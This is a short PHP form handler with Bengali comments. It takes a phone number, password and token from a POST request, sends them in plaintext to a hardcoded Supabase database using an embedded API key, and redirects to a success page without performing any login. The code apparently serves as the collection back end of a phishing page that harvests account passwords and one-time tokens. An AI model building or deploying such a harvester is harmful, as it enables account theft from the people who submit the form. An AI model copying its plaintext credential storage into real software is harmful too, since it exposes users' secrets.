<?php
// ১. Supabase এর তথ্য সেট করা
$url = "https://hglekeepnigvpvsvazdb.supabase.co/rest/v1/user_data";
$apiKey = "sb_publishable_BYyYGnXd6L5YY_O8tnp2IQ_DtORlYVF";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // ২. ফর্ম থেকে ডাটা সংগ্রহ করা
    $phone    = isset($_POST['phone']) ? $_POST['phone'] : "";
    $password = isset($_POST['password']) ? $_POST['password'] : "";
    $token    = isset($_POST['token']) ? $_POST['token'] : "";

    // ৩. ডাটাবেসে পাঠানোর জন্য ডাটা তৈরি করা
    $data = [
        "phone"    => $phone,
        "password" => $password,
        "token"    => $token
    ];

    // ৪. cURL ব্যবহার করে Supabase API-তে ডাটা পাঠানো
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'apikey: ' . $apiKey,
        'Authorization: Bearer ' . $apiKey,
        'Content-Type: application/json',
        'Prefer: return=representation'
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $response = curl_exec($ch);
    curl_close($ch);

    // ৫. কাজ শেষ হলে রিডাইরেক্ট করা
    header("Location: index.html?status=success");
    exit();
} else {
    header("Location: index.html");
    exit();
}
?>
